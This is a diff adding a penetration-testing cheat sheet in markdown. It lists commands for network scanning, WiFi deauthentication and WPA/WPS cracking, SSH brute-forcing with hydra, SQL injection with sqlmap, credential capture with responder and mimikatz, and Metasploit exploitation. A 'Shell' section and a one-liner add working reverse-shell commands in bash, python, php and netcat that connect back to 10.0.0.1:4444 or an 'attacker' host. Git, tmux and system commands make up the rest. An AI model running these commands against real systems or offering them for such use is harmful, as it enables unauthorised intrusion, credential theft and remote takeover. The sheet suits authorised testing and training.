@@ -1,0 +1,112 @@
+# Ultimate Cheat Sheet - Quick Reference
+
+## Nmap
+```bash
+nmap -sn 192.168.1.0/24           # Discover
+nmap -sS -sV -p- target            # Full scan
+nmap -sU target                    # UDP scan
+nmap -O target                     # OS detect
+nmap -A target                     # Aggressive
+nmap --script vuln target          # Vuln scan
+nmap -oA results target             # All outputs
+nmap -iL targets.txt               # From file
+```
+
+## WiFi
+```bash
+airmon-ng start wlan0              # Monitor
+airodump-ng wlan0mon               # Scan
+aireplay-ng -0 10 -a MAC wlan0mon  # Deauth
+aircrack-ng -w wordlist cap        # Crack
+reaver -i wlan0mon -b MAC -vv      # WPS
+```
+
+## Password
+```bash
+hydra -L users.txt -P pass.txt target ssh
+hashcat -m 0 hash.txt wordlist.txt
+john --wordlist=wordlist.txt hash
+```
+
+## Web
+```bash
+nikto -h target
+dirb http://target
+sqlmap -u "target/?id=1" --batch
+gobuster dir -u target -w wordlist.txt
+```
+
+## Windows
+```bash
+responder -I eth0
+crackmapexec smb target
+impacket-psexec user:pass@target
+mimikatz
+```
+
+## Shell
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+python -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"])'
+php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3");'
+```
+
+## Useful One-Liners
+```bash
+# Download
+curl -O http://site.com/file
+wget http://site.com/file
+
+# HTTP server
+python3 -m http.server 8000
+
+# Port scan
+for p in {1..1000}; do echo >/dev/tcp/host/$p 2>/dev/null && echo $p; done
+
+# Reverse shell
+nc -e /bin/sh attacker 4444
+
+# Base64 encode
+echo "text" | base64
+```
+
+## Metasploit
+```bash
+msfconsole
+search exploit type:exploit platform:windows
+use exploit/windows/smb/...
+set RHOSTS target
+set LHOST local_ip
+exploit
+```
+
+## Git
+```bash
+git clone repo
+git add .
+git commit -m "msg"
+git push origin main
+git status
+git log --oneline
+```
+
+## Tmux
+```bash
+tmux new -s pentest
+Ctrl+b d          # Detach
+tmux attach       # Attach
+Ctrl+b %          # Split
+Ctrl+b "          # Split H
+Ctrl+b arrows     # Move
+```
+
+## System
+```bash
+ss -tulpn                    # Ports
+ps aux | grep app            # Process
+top                          # Monitor
+df -h                        # Disk
+free -h                      # RAM
+whoami                       # User
+uname -a                     # Kernel
+```
